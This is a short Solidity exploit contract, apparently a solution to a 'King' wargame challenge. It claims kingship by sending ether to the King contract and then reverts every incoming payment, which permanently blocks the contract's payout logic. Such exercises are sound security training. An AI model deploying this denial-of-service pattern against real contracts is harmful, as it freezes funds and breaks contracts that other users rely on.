// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }
    // make king address payable
    // use call like before to call the king contract
    // if fallback/receive function of this contract doesn't handle payments then the 
    // transfer from the king contract after we become king will never be succesful
    function hackContract() external {
        address payable kingContract = payable(contractAddress);
        (bool sent, bytes memory data) = kingContract.call{value: address(this).balance}("");
    }

    fallback() external {
        revert("lol lol lol you can't be king");
    }
}
